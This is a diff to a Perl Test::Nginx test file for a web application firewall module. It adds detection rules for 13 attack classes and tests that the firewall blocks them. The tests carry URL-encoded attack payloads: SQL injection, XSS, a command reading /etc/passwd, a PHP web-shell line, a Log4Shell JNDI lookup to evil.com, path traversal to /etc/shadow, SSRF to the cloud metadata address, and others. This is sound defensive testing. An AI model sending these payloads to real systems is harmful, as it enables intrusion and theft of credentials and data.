@@ -25,6 +25,7 @@ select STDOUT; $| = 1;
 
 my $t = Test::Nginx->new();
 
+$t->write_file('index.html', "ok\n");
 $t->write_file_expand('nginx.conf', <<'EOF');
 
 %%TEST_GLOBALS%%
@@ -113,6 +114,30 @@ http {
 
     security_rule id:9001 "str:eq@testscorecheck" "s:$TESTCHK:10" "z:V_ARGS:foo";
 
+    # libinj:all -- 13-class unified semantic detection (extended libinjection)
+    # one rule per class tag; per-class scoring only credits a tag when the
+    # payload actually matched that class
+    security_rule id:942950 "libinj:all" "s:$SQLI:5" "z:ARGS";
+    security_rule id:941950 "libinj:all" "s:$XSS:5" "z:ARGS";
+    security_rule id:932950 "libinj:all" "s:$RCE:5" "z:ARGS";
+    security_rule id:932951 "libinj:all" "s:$RCE:5" "z:ARGS";
+    security_rule id:932952 "libinj:all" "s:$RCE:5" "z:ARGS";
+    security_rule id:932953 "libinj:all" "s:$RCE:5" "z:ARGS";
+    security_rule id:930950 "libinj:all" "s:$LFI:5" "z:ARGS";
+    security_rule id:930951 "libinj:all" "s:$LFI:5" "z:ARGS";
+    security_rule id:920950 "libinj:all" "s:$CRLF:4" "z:ARGS";
+    security_rule id:934950 "libinj:all" "s:$SSRF:5" "z:ARGS";
+    security_rule id:942951 "libinj:all" "s:$SQLI:5" "z:ARGS";
+    security_rule id:942952 "libinj:all" "s:$SQLI:5" "z:ARGS";
+    security_rule id:913950 "libinj:all" "s:$RECON:5" "z:ARGS";
+    security_rule id:911950 "libinj:all" "s:$CODE:5" "z:ARGS";
+    security_rule id:916950 "libinj:all" "s:$DESER:5" "z:ARGS";
+    security_rule id:917950 "libinj:all" "s:$LDAP:5" "z:ARGS";
+    security_rule id:918950 "libinj:all" "s:$NOSQL:5" "z:ARGS";
+    security_rule id:919950 "libinj:all" "s:$SSTI:5" "z:ARGS";
+    security_rule id:921950 "libinj:all" "s:$CRLF:4" "z:ARGS";
+    security_rule id:923950 "libinj:all" "s:$REDIRECT:5" "z:ARGS";
+
 
     server {
         listen       127.0.0.1:8080;
@@ -157,6 +182,42 @@ http {
     }
 
     server {
+        listen       127.0.0.1:8082;
+        server_name  localhost;
+
+        location / {
+            security_waf on;
+            security_log off;
+
+            # semantic 950-segment checks only fire in this server; the global
+            # legacy rules have no matching check here, so they stay silent
+            # NOTE: no `return` here — `return` finalizes in the rewrite
+            # phase and the access phase (where the WAF handler runs)
+            # would never execute; the static handler below lets requests
+            # pass through the access phase.
+            security_check $SQLI>4 BLOCK;
+            security_check $XSS>4 BLOCK;
+            security_check $RCE>4 BLOCK;
+            security_check $LFI>4 BLOCK;
+            security_check $SSRF>4 BLOCK;
+            security_check $RECON>4 BLOCK;
+            security_check $CODE>4 BLOCK;
+            security_check $DESER>4 BLOCK;
+            security_check $LDAP>4 BLOCK;
+            security_check $NOSQL>4 BLOCK;
+            security_check $SSTI>4 BLOCK;
+            security_check $CRLF>3 BLOCK;
+            security_check $REDIRECT>4 BLOCK;
+
+            # value-constrained whitelist: rule 941950 ($XSS score from the
+            # global libinj:all rule) is exempted ONLY for args "q" whose
+            # value matches ^safe$ (SecRuleUpdateTargetById-style target
+            # scoping: pattern defines the safe subset)
+            security_loc_rule "wl:941950" "z:V_ARGS:q~^safe";
+        }
+    }
+
+    server {
         listen       127.0.0.1:8081;
         server_name  localhost;
 
@@ -173,7 +234,7 @@ http {
 EOF
 
 
-$t->try_run('no waf')->plan(136);
+$t->try_run('no waf')->plan(157);
 
 ###############################################################################
 
@@ -998,4 +1059,66 @@ like(http(
 
 like(http_get("/?foo=testscorecheck"),
     qr/200 OK/, 'waf_9001: test empty score check ok');
+
+
+# --- libinj:all -- 13-class unified semantic detection (server 8082) ---
+
+# one positive per class: 403 with the payload in the query string;
+# classify_url handles the URL-decoding, raw %-forms suffice
+my %semantic = (
+    sqli     => "1%27+OR+1%3D1+--",
+    xss      => "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+    cmd      => "%3B+cat+%2Fetc%2Fpasswd",
+    code     => "%3C%3Fphp+system(%24_GET%5B0%5D)%3B+%3F%3E",
+    deser    => "%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D",
+    ssti     => "%7B%7B7%2A7%7D%7D",
+    trav     => "..%2F..%2F..%2Fetc%2Fshadow",
+    redirect => "javascript%3Aalert(1)",
+    crlf     => "a%0d%0aSet-Cookie%3A+p%3D1",
+    ssrf     => "http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F",
+    nosql    => "%27%3Bsleep(5000)%3B",
+    ldap     => "%2A%29%28uid%3D%2A%29",
+    recon    => "%2F.git%2Fconfig",
+);
+
+# semantic tests must hit server 8082 explicitly: http_get() defaults to
+# 8080, which has no 950-segment checks. One fresh connection per request.
+sub sem_get($) {
+    my ($url) = @_;
+    my $sock = IO::Socket::INET->new(
+        Proto => 'tcp', PeerAddr => '127.0.0.1:' . port(8082)
+    ) or die "can't connect to 8082: $!\n";
+    return http_get($url, socket => $sock);
+}
+
+for my $cls (sort keys %semantic) {
+    like(sem_get("/?q=$semantic{$cls}"),
+        qr/403 Forbidden/, "waf_semantic: $cls payload blocked");
+}
+
+for my $benign ("world", "laptop%20sleeve", "%7B%7D", "abc123") {
+    like(sem_get("/?q=$benign"),
+        qr/200 OK/, "waf_semantic: benign allowed ($benign)");
+}
+
+# --- wl value constraint (target-level whitelist, SecRuleUpdateTargetById
+# semantics): `z:V_ARGS:q~^safe` suppresses rule 941950 (XSS) ONLY when the
+# value of args "q" matches ^safe. Same payload in other args still blocks.
+
+# q value matches the constraint -> XSS rule skipped -> 200
+like(sem_get("/?q=safe%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
+    qr/200 OK/, 'waf_wlv: value-constrained arg whitelisted');
+
+# value does NOT match -> still blocked
+like(sem_get("/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
+    qr/403 Forbidden/, 'waf_wlv: non-matching value still blocked');
+
+# same payload in another arg (name mismatch) -> still blocked
+like(sem_get("/?p=safe%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
+    qr/403 Forbidden/, 'waf_wlv: other arg not whitelisted');
+
+# benign untouched
+like(sem_get("/?q=safeworld"),
+    qr/200 OK/, 'waf_wlv: benign allowed');
+
 ###############################################################################
